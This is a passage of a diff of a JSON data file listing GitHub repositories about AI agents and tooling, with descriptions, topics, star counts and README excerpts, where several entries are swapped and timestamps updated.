[[Documentation](https://claw.mate.vip/docs)] [[中文](README_zh.md)] </div> <p align=\"center\"> <img src=\"assets/images/preview.png\" alt=\"MateClaw Preview\" width=\"800\"> </p> --- > **Other personal AI agents are built for one person. MateClaw is the one your IT department can actually sign off on.** > > Multi-user workspaces. Approval-gated sensitive actions. Full audit trail. Spring Boot Actuator health monitoring. Per-channel error isolation so one chat platform's outage doesn't take down the rest. One JAR on your own machine, zero data egress. > > **And underneath, a real agent harness.** ReAct + Plan-and-Execute on a StateGraph runtime — not a one-shot RAG call dressed up. Tools, Skills, MCP, and ACP converge on one registry with per-employee binding. Sensitive tool calls flow through an approval gate you can actually inspect. Multi-vendor failover keeps the loop running when a provider doesn't. Most AI tools die when their vendor has a bad day. Most forget yo\n\n[TRUNCATED]",
         "text_source_field": "readme_text",
         "text_truncated_in_raw": false
       },
@@ -315,7 +242,7 @@
         "url": "https://github.com/iAmCorey/kooky",
         "description": "A minimal modern terminal for AI coding experience — Sidebar workspaces; horizontal / vertical split panes; one-click agent launch; per-agent activity readout; live workspace state with one-click Node and branch switching.",
         "stars": 526,
-        "pushed_at": "2026-06-29T02:47:19Z",
+        "pushed_at": "2026-06-29T03:21:07Z",
         "topics": [
           "agent",
           "ai-agents",
@@ -343,7 +270,7 @@
         "url": "https://github.com/avibe-bot/avibe",
         "description": "The local-first Agent OS — your AI partner lives on your own machine. Drive the official Claude Code, Codex & OpenCode from your browser or any chat app.",
         "stars": 477,
-        "pushed_at": "2026-06-29T03:04:10Z",
+        "pushed_at": "2026-06-29T03:20:06Z",
         "topics": [
           "agent",
           "agent-os",
@@ -369,31 +296,89 @@
         "text_truncated_in_raw": false
       },
       {
-        "name": "AIHelms",
-        "full_name": "beizhu-1209/AIHelms",
-        "url": "https://github.com/beizhu-1209/AIHelms",
-        "description": "企业级 AI 资源纳管平台，提供统一 AI网关，纳管 OpenAI、Azure、Claude、DeepSeek 等主流模型，并支持 MCP 工具与 Skill 的集中注册分发。具备内外双轨定价、成本归因、统一身份认证、安全审计与效能报表，帮助企业精准控制成本、量化 ROI，高效治理 AI 资产。",
-        "stars": 446,
-        "pushed_at": "2026-06-29T02:54:41Z",
+        "name": "models",
+        "full_name": "reyamira/models",
+        "url": "https://github.com/reyamira/models",
+        "description": "TUI and CLI for browsing AI models, benchmarks, coding agents, and statuses for AI providers.",
+        "stars": 456,
+        "pushed_at": "2026-06-29T03:17:52Z",
         "topics": [
-          "agent",
-          "ai-management",
-          "ai-observability",
-          "claude",
-          "cost-control",
-          "deepseek",
-          "docker",
-          "enterprise-ai",
-          "fastapi",
-          "llm-governance",
-          "mcp",
-          "model-gateway",
-          "openai",
-          "skill-management",
-          "vue3"
+          "ai",
+          "anamolyco",
+          "artificial-analysis",
+          "benchmarks",
+          "claude-code",
+          "codex",
+          "coding-agents",
+          "gemini-cli",
+          "llm",
+          "models",
+          "models-dev",
+          "openclaw",
+          "opencode",
+          "ratatui",
+          "rust",
+          "sst",
+          "sst-inspired",
+          "status",
+          "status-page",
+          "tui"
         ],
         "source": "search",
-        "text_excerpt": "<div align=\"center\"> <img src=\"ui/static/img/logo.png\" alt=\"AIHelms\" width=\"100\"> <p><strong>企业 AI 资源纳管平台</strong></p> <p>承载 AI 数字资产 · 释放 AI 生产力 · 链接未来</p> [![Release](https://img.shields.io/badge/Release-v0.1.0-brightgreen.svg)](https://github.com/beizhu-1209/AIHelms/releases) [![Docker](https://img.shields.io/badge/Docker-Compose-2496ED.svg)](https://www.docker.com/) [![Python](https://img.shields.io/badge/Python-3.11+-3776AB.svg)](https://www.python.org/) [![FastAPI](https://img.shields.io/badge/FastAPI-009688.svg)](https://fastapi.tiangolo.com/) [![Vue](https://img.shields.io/badge/Vue-3.4+-4FC08D.svg)](https://vuejs.org/) [![TypeScript](https://img.shields.io/badge/TypeScript-3178C6.svg)](https://www.typescriptlang.org/) [![TailwindCSS](https://img.shields.io/badge/TailwindCSS-06B6D4.svg)](https://tailwindcss.com/) [![PostgreSQL](https://img.shields.io/badge/PostgreSQL-16+-336791.svg)](https://www.postgresql.org/) [![Redis](https://img.shields.io/badge/Redis-7+-DC382D.svg)](https://redis.io/) [![vLLM](https://img.shields.io/badge/vLLM-FF6F00.svg)](https://docs.vllm.ai/) [![SGLang](https://img.shields.io/badge/SGLang-8B5CF6.svg)](https://github.com/sgl-project/sglang) [核心价值](#核心价值) · [功能展示](#功能展示) · [快速开始](#快速开始) · [部署文档](#部署) </div> --- <!-- Banner 截图：管理后台 Dashboard 全貌 --> <!-- ![AIHelms](docs/assets/screenshot-banner.png) --> ## 这是什么 AIHelms 是面向企业的 AI 资源纳管平台。帮助企业**管理 AI 资产、控制 AI 成本、衡量 AI 价值**的管理工具。 - **决策层** - 平台全程记录用量、核算成本、生成报表，让看得见 AI 的投入产出比 - **管理员** - 通过后台统一接入模型、分配身份、设定预算 - **员工** - 通过用户端获取 AI 身份，接入任意客户端使用 ![架构图](docs/struct.png) ## 核心价值 ### 成本可见可控 企业使用 AI 最大的焦虑是\"钱花了但不知道花在哪\"。AIHelms 建立了完整的成本体系： - **内外双轨定价** — 外部成本（供应商实际收费）和内部结算价（企业对部门的计费）分开核算。企业可以按成本价透传，也可以加价内部结算 - **多维预算管控** — 按人、按部门、按项目、按模型设预算，支持软限制（预警）和硬限制（超支停用） - **实时成本归因** — 每一次调用都能追溯到具体的人、部门、项目、模型，精确到 token 级别 ### 统一身份统一入口 - 每位员工一个 AI 身份（API Key），一个入口访问所有 AI 资源 - AI员工（进行中） ### 量化 AI 价值 - **覆盖率** — 部门覆盖率、人员激活率、模型使用分布 - **活跃度** — 日均调用量、人均 token 消耗、使用趋势曲线 - **成本效能** — 部门成本排名、模型性价比、预算消耗进度、内外成本差异 - **效能报告** — 周/月自动生成，支持按部门、项目、模型多维下钻 ### 安全审计 - 敏感信息识别 - 高风险 prompt 拦截 - 管理员操作追踪 ### 资源集中管理 - **模型纳管** — 多供应商统一接入，同模型多部署负载均衡，OpenAI/Anthropic 双格式兼容 - **Skill & MCP** — 企业内部 AI 工具统一注册、审批、分发 - **权限精细化** — 谁能用什么模型、用多少额度、什么时候过期，全部可配置 ## 主要功能 ### 管理后台 面向 IT 管理员和 AI 负责人，覆盖资源管理全流程。 | <img src=\"docs/dashboard.png\" width=\"400\" height=\"250\"> | <img src=\"docs/model.png\" width=\"400\" height=\"250\"> | |:---:|:---:| | **\n\n[TRUNCATED]",
+        "text_excerpt": "<p align=\"center\"> <img src=\"public/assets/logo.svg\" alt=\"models\" width=\"420\"> </p> <p align=\"center\"> <a href=\"https://crates.io/crates/modelsdev\"><img src=\"https://img.shields.io/crates/v/modelsdev.svg?label=version\" alt=\"Version\"></a> <a href=\"https://github.com/reyamira/models/actions/workflows/update-benchmarks.yml\"><img src=\"https://github.com/reyamira/models/actions/workflows/update-benchmarks.yml/badge.svg\" alt=\"Benchmarks\"></a> <a href=\"https://opensource.org/licenses/MIT\"><img src=\"https://img.shields.io/badge/License-MIT-yellow.svg\" alt=\"License: MIT\"></a> <a href=\"https://buymeacoffee.com/arimxyer\"><img src=\"https://img.shields.io/badge/Buy%20Me%20a%20Coffee-ffdd00?logo=buy-me-a-coffee&logoColor=black\" alt=\"Buy Me a Coffee\"></a> </p> TUI and CLI for browsing AI models, benchmarks, coding agents, and provider statuses. ![Models tab screenshot](public/assets/models-screenshot.png) ## Highlights - **~4,000+ models** across 85+ providers from [models.dev](https://models.dev) — filter by capability, price, context, and provider category - **~1,000 benchmark entries** across 4 data sources — [Artificial Analysis](https://artificialanalysis.ai), [Epoch AI](https://epoch.ai), [Arena](https://arena.ai), and [LLM Stats](https://llm-stats.com) — compare models head-to-head with scatter plots and radar charts - **11+ coding agents** tracked with version detection, changelogs, and GitHub integration - **22 provider statuses** monitored live across 7 status page platforms ## What's New in v0.12.1 - **Mouse support** — click a row to select it, click a panel to focus it, click a header tab to switch tabs, and scroll with the wheel. Popups (sort, columns, glossary, trackers, help) scroll and accept row clicks too. ## What's New in v0.12.0 - **Multi-source benchmarks** — 4 switchable data sources (Artificial Analysis, Epoch AI, Arena, LLM Stats) with state-preserving switching, in-app refresh, and a benchmark glossary - **Column picker** — choose which metric columns are visible, persisted per source in config.toml - **Comparator column** — cycle field average / peer average / rank alongside every score in the detail panel - **Refresh keys everywhere** — refresh benchmarks, models.dev data, and agent GitHub data without restarting - **`default_tab` config** — launch the TUI straight into your tab of choice - **Prebuilt Nix binaries** — builds are pushed to a publ\n\n[TRUNCATED]",
+        "text_source_field": "readme_text",
+        "text_truncated_in_raw": false
+      },
+      {
+        "name": "loushang",
+        "full_name": "zhnt/loushang",
+        "url": "https://github.com/zhnt/loushang",
+        "description": "AI-native agent harness for coding workflows by python: multi-model LLM orchestration, stateful sessions, tool governance, traceable delivery, and provider routing for GPT, Claude, DeepSeek, Qwen, Kimi, GLM, and MiniMax.",
+        "stars": 395,
+        "pushed_at": "2026-06-29T03:06:58Z",
+        "topics": [
+          "agent",
+          "agent-harness",
+          "agentic",
+          "ai",
+          "chatgpt",
+          "claude",
+          "claude-code",
+          "codex",
+          "coding",
+          "deepseek",
+          "dynamic-workflows",
+          "glm",
+          "harness",
+          "kimi",
+          "minimax",
+          "parallel-agents",
+          "python",
+          "skills",
+          "vibe-coding",
+          "workflow"
+        ],
+        "source": "search",
+        "text_excerpt": "# Loushang English | [中文](./README.zh-CN.md) Loushang is a method-native AI work system for running complex work from intent to verified delivery. Current focus: `loushang code`, a CLI and terminal workbench for software development with model routing, persistent sessions, tools, extensions, and method-guided delivery. ## Why Loushang Modern AI agents can plan and act, but complex work still breaks down when context is lost, execution cannot be resumed, tools are hard to govern, and results are not verified. Loushang treats methods, stages, roles, tools, sessions, and work products as runtime objects. The goal is not just to make agents smarter, but to make complex work more reliable, recoverable, auditable, and deliverable. ## What You Can Use Today - `loushang code`: a coding-focused CLI and terminal workbench. - `loushang.ai`: a provider-aware AI SDK with model registry, streaming, tool calls, and cost helpers. - Sessions: persistent coding sessions with resume, fork, export, and diagnostics. - Tools: built-in coding tools and configurable tool surfaces. - Extensions: project-level extension hooks, custom tools, dynamic resources, and commands. - Methods and skills: method-guided coding turns and reusable workflow assets. ## Quick Start Loushang is in early development. The recommended path is to run it from source. ```bash git clone https://github.com/zhnt/loushang.git cd loushang uv venv .venv source .venv/bin/activate uv pip install -e \".[dev]\" loushang --help loushang --list-models loushang --list-commands loushang -p \"Inspect this repository and summarize what it does.\" ``` You can also run `make bootstrap`, which creates `.venv/` with `uv` and installs the project in editable development mode. The Makefile does not currently provide a `make install` target; use `make bootstrap` for local development or `make install-binary` for a local binary install. For local development in this repository, use the project virtual environment in `.venv/`. ## Core Concepts - Method: a structured work contract that defines roles, phases, workflow, constraints, artifacts, and acceptance expectations for a class of work. - Session: a durable coding conversation and execution record that can be resumed, forked, exported, and inspected. - Tool: an executable capability made available to the agent under policy. - Extension: project-level Python code that can contribute h\n\n[TRUNCATED]",
+        "text_source_field": "readme_text",
+        "text_truncated_in_raw": false
+      },
+      {
+        "name": "ai-shifu",
+        "full_name": "ai-shifu/ai-shifu",
+        "url": "https://github.com/ai-shifu/ai-shifu",
+        "description": "Get AI to teach and answer questions for you - just by typing!",
+        "stars": 299,
+        "pushed_at": "2026-06-29T03:15:48Z",
+        "topics": [
+          "agent",
+          "ai",
+          "education",
+          "llm",
+          "teaching-assistant"
+        ],
+        "source": "search",
+        "text_excerpt": "<div align=\"center\"> <img src=\"assets/logo_en.png\" width=256></img> <p><strong>Write Once, Teach Personally</strong></p> English | [简体中文](README_ZH-CN.md) </div> AI-Shifu is designed for creators, instructors, and training/education teams, offering a scalable one-on-one teaching agent. Provide your expertise and teaching intent once, AI-Shifu will expand it into complete, personalized learning experiences. It adapts in real time to each learner’s profile with tailored explanations, interactive probing, assessments, and a full feedback loop—amplifying both your efficiency and the learner’s experience. Developed by the AI-Shifu Team and the Research Center of Intelligent Software Engineering at Harbin Institute of Technology. # Core Capabilities - **Personalized explanation engine** — Generates learning paths and tone based on learner background, goals, and level. - **Interactive Q&A & probing** — Decomposes questions, asks clarifiers, and suggests next actions during sessions. - **Rapid course assembly** — Author with high-level frameworks and intent; AI-Shifu elaborates into lessons, activities, and assessments. - **Reduced production & delivery overhead** — Minimizes repetitive prep and support; every learner gets a dedicated “AI tutor.” - **Multi-channel integration** — Embeddable in websites, course platforms, and enterprise training portals. # Use Cases - **Course creators** — Hand a single lesson framework to AI-Shifu; learners receive personalized explanations and real-time interaction. - **Enterprise training** — Input training content once; employees get role- and background-specific learning paths. - **Educators** — Provide a syllabus to generate personalized coaching content plus a Q&A assistant. # Roadmap - [ ] Writing AI agent for rapid script generation and maintenance - [ ] Knowledge base - [ ] Speech input and output # Using AI-Shifu ## Platform [AI-Shifu.com](https://ai-shifu.com) is an education platform powered by AI-Shifu. You can try it and learn the AI-guided courses developed by human experts. ## Self-hosting > For source code installation, please refer to the [Installation Manual](INSTALL_MANUAL.md) Make sure your machine has installed [Docker](https://docs.docker.com/get-docker/) and [Docker Compose](https://docs.docker.com/compose/install/). ### Quick Start (Docker, zero config) ```bash git clone https://github.com/ai-shifu/ai-shifu.\n\n[TRUNCATED]",
         "text_source_field": "readme_text",
         "text_truncated_in_raw": false
       },
@@ -403,7 +388,7 @@
         "url": "https://github.com/854875058/Symbio",
         "description": "🧬 Symbio（共生）- AI Infra 级多 Agent 协同框架 | 33 Killer Features: 动态 DAG, 本体化记忆, 防过早完成, 数据飞轮, 神经符号安全, OpenTelemetry 可观测, HITL 人类介入, MCP 原生支持, 语义缓存, PromptOps, 边缘计算, 隐私计算 | Next-Gen AI Infrastructure for Multi-Agent Orchestration",
         "stars": 295,
-        "pushed_at": "2026-06-29T02:58:54Z",
+        "pushed_at": "2026-06-29T03:07:02Z",
         "topics": [
           "agent",
           "ai",
@@ -422,91 +407,100 @@
         "text_truncated_in_raw": false
       },
       {
-        "name": "aidevops",
-        "full_name": "marcusquinn/aidevops",
-        "url": "https://github.com/marcusquinn/aidevops",
-        "description": "Vibe-Coding is easy. DevOps is hard. OpenCode & Git token-efficient AI agent automation for your app, business, and personal development. Opinionated tools, services, CLI & API stack for speed, security, and 24/7 results. Open-source first. SOTA everything. Try on your repos for money-making magic.",
-        "stars": 272,
-        "pushed_at": "2026-06-29T03:04:44Z",
+        "name": "Awesome-Self-Evolving-Agents",
+        "full_name": "XMUDeepLIT/Awesome-Self-Evolving-Agents",
+        "url": "https://github.com/XMUDeepLIT/Awesome-Self-Evolving-Agents",
+        "description": "A Survey of Self-Evolving Agents | A curated list of resources (surveys, papers, benchmarks, and opensource projects) on Self-Evolving Agents.",
+        "stars": 282,
+        "pushed_at": "2026-06-29T03:08:16Z",
         "topics": [
-          "agents",
-          "agents-md",
-          "ai",
-          "ai-agents",
-          "ai-assistant",
-          "ai-assistants",
-          "ai-assisted-development",
-          "ai-code-review",
-          "ai-coding",
-          "ai-dev-ops",
-          "ai-devops",
-          "ai-system-admin",
-          "claude",
-          "devops",
-          "devops-tools",
-          "git-workflow",
-          "git-worktrees",
-          "opencode",
-          "opencode-plugin"
+          "agent",
+          "agent-skills",
+          "agent-survey",
+          "awsome-self-evolving-agents",
+          "self-evolution",
+          "self-evolving",
+          "self-evolving-agents",
+          "skill-survey"
         ],
         "source": "search",
-        "text_excerpt": "<!-- SPDX-License-Identifier: MIT --> <!-- SPDX-FileCopyrightText: 2025-2026 Marcus Quinn --> # AI DevOps Framework **[aidevops.sh](https://aidevops.sh)** is an [OpenCode](https://opencode.ai/) plugin and AI DevOps framework for people who want AI to do useful work across code, infrastructure, business, marketing, content, and creative projects without turning every job into another long, fragile chat. Most AI tools still leave you doing the hard coordination yourself: finding the right context, choosing a model, protecting secrets, managing branches, watching CI, spotting stuck work, and remembering what went wrong last time. aidevops puts structure around that work so agents can share context, work safely in parallel, spend model budget where it matters, and leave the system better than they found it. > **Recommended setup:** [OpenCode](https://opencode.ai/) + OpenAI models. GPT-5.5 is the preferred high-capability model for complex agent work; GPT-5.4 mini is the preferred fast, lower-cost model for triage and routine implementation. Claude models (Anthropic) remain fully supported, and other model providers are evaluated from time to time as their quality, latency, and cost profiles change. *\"Scope a mission to redesign the landing pages — break it into milestones, dispatch workers in parallel, validate each milestone, and track budget across the whole project.\"* **One conversation, autonomous project delivery, with security, teamwork, token efficiency, and quality control built in.** Founded by [Marcus Quinn](https://github.com/marcusquinn) on 9th November 2025 to help anyone level-up their AI & Open-Source game. ## **The Aim** **Maximum value for your time and money.** **[aidevops](https://aidevops.sh)** is built for the gap between “the model can probably do this” and “the work is actually done, verified, safe, and worth the cost.” - Load the right context when it is needed, instead of stuffing every agent, skill, and tool into the prompt. - Spend tokens and model budget deliberately. Cheap and fast models should handle routine work; stronger models should handle judgement, architecture, review, and risk. - Keep secrets out of chat. Credentials, tenants, scans, confirmations, and audit logs are part of the workflow, not an afterthought. - Let people and agents work across machines without trampling each other. Worktrees, branches, PRs, task IDs, mailb\n\n[TRUNCATED]",
-        "text_source_field": "readme_text",
-        "text_truncated_in_raw": true
-      },
-      {
-        "name": "ggsrun",
-        "full_name": "tanaikech/ggsrun",
-        "url": "https://github.com/tanaikech/ggsrun",
-        "description": "High-performance Google Drive CLI and Model Context Protocol (MCP) Server for LLM/AI agents. Natively execute Google Apps Script (GAS) under a secure whitelisted runtime sandbox, automate transfers, and manage Drive infrastructure.",
-        "stars": 167,
-        "pushed_at": "2026-06-29T03:03:12Z",
-        "topics": [
-          "ai-agents",
-          "cli",
-          "cli-app",
-          "cli-tool",
-          "concurrency",
-          "developer-tools",
-          "gas",
-          "golang",
-          "google-apps-script",
-          "google-apps-script-api",
-          "google-drive",
-          "llm",
-          "llm-tools",
-          "mcp",
-          "mcp-server",
-          "model-context-protocol",
-          "sandboxing",
-          "security-sandbox",
-          "terminal",
-          "terminal-app"
-        ],
-        "source": "search",
-        "text_excerpt": "# ggsrun ![](help/images/fig1a.jpg) <a name=\"top\"></a> [![Go Version](https://img.shields.io/badge/Go-1.26.4+-00ADD8?style=for-the-badge&logo=go)](https://golang.org) [![MCP Ready](https://img.shields.io/badge/MCP-Ready-8A2BE2?style=for-the-badge)](https://modelcontextprotocol.io) [![Build Status](https://img.shields.io/badge/build-passing-brightgreen?style=for-the-badge)]() [![MIT License](https://img.shields.io/badge/license-MIT-blue.svg?style=for-the-badge)](LICENCE) --- ## 🚀 Overview **ggsrun** is an enterprise-grade CLI application and Model Context Protocol (MCP) Server designed to relentlessly orchestrate Google Drive I/O operations and statefully execute Google Apps Script (GAS) natively from your local terminal or via autonomous Large Language Model (LLM) agents. Built on Go 1.26.4+, `ggsrun` transitions legacy single-threaded processing into a state-of-the-art, channel-based concurrent streaming architecture. It delivers maximum network throughput, native Shared Drives (Omni-Drive) support, advanced MIME resolution, resilient self-healing retries, and a native **Security Sandbox** to restrict Google Workspace APIs during autonomous executions. --- ## 🗺️ Documentation Directory Index To make onboarding, development, and advanced operations as seamless as possible, our documentation is fully modularized. Navigate directly to your area of interest: | Guide / Manual | Description | Link | | :--- | :--- | :--- | | 🚀 **Setup & Onboarding Guide** | Step-by-step instructions to configure GCP, generate OAuth2 client secrets, link Google Apps Script, and deploy gateway endpoints. | **[Setup Guide](docs/setup_guide.md)** | | 📖 **Command Reference Manual** | In-depth breakdown of all 15+ subcommands (e.g. `exe1`, `exe2`, `download`, `upload`), recipes, and Mermaid architectural diagrams. | **[Command Reference](docs/commands_reference.md)** | | 🛡️ **Security Sandbox Guide** | Explains the memory-based wrapper injection, whitelist configuration schemas (`sandbox_config.json`), and security validation scenarios. | **[Sandbox Guide](docs/sandbox_guide.md)** | | 🔄 **Stateful Execution Lifecycle** | Deep-dive explanation of the backup, sandboxing, upload, execution, and resilient rollback phases of the `exe1` command. | **[Execution Lifecycle](docs/exe1_lifecycle.md)** | | 🤖 **MCP Server Guide** | Configuration to run `ggsrun` as an autonomous tool provider in AI e\n\n[TRUNCATED]",
+        "text_excerpt": "# Awesome-Self-Evolving-Agents <div align=\"center\"> <a href=\"https://awesome.re\"><img src=\"https://awesome.re/badge.svg\"/></a> <a href=\"http://makeapullrequest.com\"><img src=\"https://img.shields.io/badge/PRs-welcome-green.svg\"/></a> <a href=\"https://doi.org/10.36227/techrxiv.177203250.05832634/v2\" target=\"_blank\"><img src=\"https://img.shields.io/badge/Paper-Arxiv-red?logo=arxiv&style=flat-square\" alt=\"arXiv:2602.05665\"></a> <a href=\"http://makeapullrequest.com\"><img src=\"https://img.shields.io/github/stars/XMUDeepLIT/Awesome-Self-Evolving-Agents\"/></a> </div> This repository provides a comprehensive collection of research papers, benchmarks, and open-source projects on **Self-Evolving Agents**. It includes contents from our survey paper 📖<em>\"[**A Systematic Survey of Self-Evolving Agents: From Model-Centric to Environment-Driven Co-Evolution**](https://doi.org/10.36227/techrxiv.177203250.05832634/v2)\"</em> and will be continuously updated. 🤗 **You're very welcome to contribute to this repository**. If you find any missing resources or come across interesting new research works, please don’t hesitate to launch an issue or submit a pull request! 📫 **Contact us via emails:** `{xiangzhishang,yangchengyi}@stu.xmu.edu.cn`, `qinggangzhang@jlu.edu.cn` **📃 Please [cite our paper](#-citation)** if you find our survey or repository helpful! ``` @article{xiang2026systematic, title={A Systematic Survey of Self-Evolving Agents: From Model-Centric to Environment-Driven Co-Evolution}, author={Xiang, Zhishang and Yang, Chengyi and Chen, Zerui and Wei, Zhimin and Tang, Yunbo and Teng, Zongpei and Peng, Zexi and Li, Zongxia and Huang, Chengsong and He, Yicheng and others}, journal={Available at SSRN 6626878}, year={2026} } ``` --- # 🎉 News - **[2026-03]** We release the [TTCS](https://arxiv.org/abs/2601.22628) and accepted by [ICLR 2026 Lifelong Agent(LLA)](https://iclr.cc/virtual/2026/workshop/10000805) workshop! - **[2026-02]** We release the survey of [Self-Evolving Agents](https://github.com/XMUDeepLIT/Awesome-Agentic-Self-Evolution). --- <div> <h3 align=\"center\"> <p align=\"center\"><img width=\"100%\" src=\"figs/intro.png\" /></p> <p align=\"center\"><em>A Comprehensive Taxonomy of Self-Evolving Agents.</em></p> </div> Agentic Self-Evolving represents a paradigm shift in AI development, enabling systems to autonomously improve through three key dimensions: - **Model-Centric Sel\n\n[TRUNCATED]",
         "text_source_field": "readme_text",
         "text_truncated_in_raw": false
       },
       {
-        "name": "vibes.diy",
-        "full_name": "VibesDIY/vibes.diy",
-        "url": "https://github.com/VibesDIY/vibes.diy",
-        "description": "Shareable apps in seconds",
-        "stars": 127,
-        "pushed_at": "2026-06-29T03:04:20Z",
+        "name": "tinybot",
+        "full_name": "SudoJacky/tinybot",
+        "url": "https://github.com/SudoJacky/tinybot",
+        "description": "Tinybot is a lightweight personal AI Agent that is constantly evolving",
+        "stars": 186,
+        "pushed_at": "2026-06-29T03:20:56Z",
         "topics": [
+          "agent",
           "ai",
-          "claude",
-          "codegen",
-          "frontend",
-          "javascript",
-          "openrouter",
-          "react",
-          "vibecode"
+          "ai-agent",
+          "deepseek",
+          "llm",
+          "memory",
+          "python",
+          "qwen",
+          "rag",
+          "task-scheduler",
+          "webui"
         ],
         "source": "search",
-        "text_excerpt": "[![Join our Discord](https://discord-badge.selem.workers.dev/i/vnpWycj4Ta.svg)](https://discord.gg/vnpWycj4Ta) # ✨ Vibes DIY — make apps with your friends Software is getting weird again. Describe what you want and get a real, live app — fun, done, and alive. [Try it now](https://vibes.diy/) or [fork on GitHub](https://github.com/VibesDIY/vibes.diy). Make apps with your friends, so easy even AI can do it. Describe your app in plain words, it builds instantly, and you keep changing it just by talking to it. Share the link and your friends join right away — no setup, no \"wait, let me send you the invite.\" ## Why it's different - **Fun** — build for any reason, or no reason at all. - **Done** — it's a real app at its own live link, not a prototype. State is saved automatically. - **Alive** — keep talking to it and it keeps changing. So can anyone you share it with. Seeing a vibe makes you want to change it. Start from someone else's, tweak it to fit you, share it, and the people you share with remix their own version. You're not a user anymore — you're a maker. ## What people make A character bot that answers in your voice. A neighborhood resource tracker you share at the next town meeting. A flashcard app remixed into collaborative trivia your students change live. A workout tracker a whole gym swaps routines on. Every one is the same move: start, tweak, share, remix. ## Yours to control Private by default — or open to the world. You choose. Keep an app to the people you invite, or publish it so anyone can use and remix it. You set who can read, write, and open it. > Your app's data lives in a centralized cloud database. \"Private\" means access-gated from other people — not encrypted, and not hidden from the platform. ## Open source The whole platform is open source under Apache 2.0. Read the code, open an issue, send a PR. ## Quick Start 1. [Try the demo](https://vibes.diy/) — no setup required. 2. Or run it yourself: - Clone the repository - Install with `pnpm i` - Run `pnpm dev` ## Community We are committed to providing a welcoming and inclusive environment for all contributors. Please review our [Code of Conduct](CODE_OF_CONDUCT.md) before participating. Interested in contributing? Check out our [Contributing Guide](CONTRIBUTING.md) to get started. Find us on [Discord](https://discord.gg/vnpWycj4Ta), [Substack](https://vibesdiy.substack.com/), [YouTube](ht\n\n[TRUNCATED]",
+        "text_excerpt": "# Tinybot <p align=\"center\"> <img src=\"./webui/assets/logo.svg\" width=\"96\" alt=\"Tinybot logo\"> </p> [![Python](https://img.shields.io/badge/Python-3.13%2B-blue?logo=python&logoColor=white)](https://www.python.org/) [![License](https://img.shields.io/badge/License-MIT-green?logo=opensourceinitiative&logoColor=white)](LICENSE) [![GitHub Stars](https://img.shields.io/github/stars/SudoJacky/tinybot?style=social&logo=github)](https://github.com/SudoJacky/tinybot/stargazers) [![GitHub Clones](https://img.shields.io/badge/dynamic/json?color=success&label=Clone&query=count&url=https://gist.githubusercontent.com/SudoJacky/1ed488e49d2ce0a4af8ce5a63af4396e/raw/clone.json&logo=github)](https://github.com/MShawon/github-clone-count-badge) [![GitHub Issues](https://img.shields.io/github/issues/SudoJacky/tinybot?logo=github)](https://github.com/SudoJacky/tinybot/issues) [![GitHub Release](https://img.shields.io/github/v/release/SudoJacky/tinybot?include_prereleases&logo=github)](https://github.com/SudoJacky/tinybot/releases) [![oosmetrics](https://api.oosmetrics.com/api/v1/badge/achievement/2a28dc05-c0df-45b8-babd-90411f7c20aa.svg)](https://oosmetrics.com/repo/SudoJacky/tinybot) [![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/SudoJacky/tinybot) [中文文档](README_ZH.md) | [Quick Start](#quick-start) | [Features](#-core-highlights) | [Commands](#interactive-chat-commands) A lightweight personal AI assistant framework that integrates Large Language Models with multiple chat platforms, tool systems, and automation mechanisms. ## Change log <details> <summary>2026.05.24 Event-oriented frontend components inspired by AG-UI, plus A2UI-style form collection when Tinybot needs follow-up information from the user.</summary> ![form](./show/webui_form.PNG) </details> <details> <summary>2026.05.22 Implemented an efficient, real-time, editable memory system maintained alongside the agent, using memory state labels to handle contradictory memories over time.</summary> ![save](./show/webui_memory_save.PNG) ![load](./show/webui_memory_load.PNG) ```mermaid flowchart TD UserTurn[\"Completed agent turn\"] --> SaveSession[\"SessionHandler.save_turn\"] SaveSession --> CaptureEvidence[\"capture_conversation_evidence\"] CaptureEvidence --> EvidenceFiles[\"memory/conversations/*.jsonl\"] CaptureEvidence --> Schedule[\"Memory extraction schedule\"] Schedule --> DreamRun[\"Dream.run\"] DreamR\n\n[TRUNCATED]",
+        "text_source_field": "readme_text",
+        "text_truncated_in_raw": false
+      },
+      {
+        "name": "go-anthropic",
+        "full_name": "liushuangls/go-anthropic",
+        "url": "https://github.com/liushuangls/go-anthropic",
+        "description": "Anthropic Claude API wrapper for Go",
+        "stars": 173,
+        "pushed_at": "2026-06-29T03:17:38Z",
+        "topics": [
+          "ai",
+          "anthropic",
+          "claude",
+          "claude-ai",
+          "claude-api",
+          "function-calling",
+          "go",
+          "golang",
+          "llm",
+          "prompt-caching",
+          "streaming-api",
+          "tool-use",
+          "vision"
+        ],
+        "source": "search",
+        "text_excerpt": "# go-anthropic [![Go Reference](https://pkg.go.dev/badge/github.com/liushuangls/go-anthropic/v2.svg)](https://pkg.go.dev/github.com/liushuangls/go-anthropic/v2) [![Go Report Card](https://goreportcard.com/badge/github.com/liushuangls/go-anthropic/v2)](https://goreportcard.com/report/github.com/liushuangls/go-anthropic/v2) [![codecov](https://codecov.io/gh/liushuangls/go-anthropic/graph/badge.svg?token=O6JSAOZORX)](https://codecov.io/gh/liushuangls/go-anthropic) [![Sanity check](https://github.com/liushuangls/go-anthropic/actions/workflows/pr.yml/badge.svg)](https://github.com/liushuangls/go-anthropic/actions/workflows/pr.yml) Anthropic Claude API wrapper for Go (Unofficial). This package has support for: - Completions - Streaming Completions - Messages - Streaming Messages - Message Batching - Vision and PDFs - Tool use (with [computer use](https://docs.anthropic.com/en/docs/build-with-claude/computer-use)) - Prompt Caching - Token Counting ## Installation ``` go get github.com/liushuangls/go-anthropic/v2 ``` Currently, go-anthropic requires Go version 1.21 or greater. ## Usage ### Messages example usage: ```go package main import ( \"errors\" \"fmt\" \"github.com/liushuangls/go-anthropic/v2\" ) func main() { client := anthropic.NewClient(\"your anthropic api key\") resp, err := client.CreateMessages(context.Background(), anthropic.MessagesRequest{ Model: anthropic.ModelClaude3Haiku20240307, Messages: []anthropic.Message{ anthropic.NewUserTextMessage(\"What is your name?\"), }, MaxTokens: 1000, }) if err != nil { var e *anthropic.APIError if errors.As(err, &e) { fmt.Printf(\"Messages error, type: %s, message: %s\", e.Type, e.Message) } else { fmt.Printf(\"Messages error: %v\\n\", err) } return } fmt.Println(resp.Content[0].GetText()) } ``` ### Messages stream example usage: ```go package main import ( \"errors\" \"fmt\" \"github.com/liushuangls/go-anthropic/v2\" ) func main() { client := anthropic.NewClient(\"your anthropic api key\") resp, err := client.CreateMessagesStream(context.Background(), anthropic.MessagesStreamRequest{ MessagesRequest: anthropic.MessagesRequest{ Model: anthropic.ModelClaude3Haiku20240307, Messages: []anthropic.Message{ anthropic.NewUserTextMessage(\"What is your name?\"), }, MaxTokens: 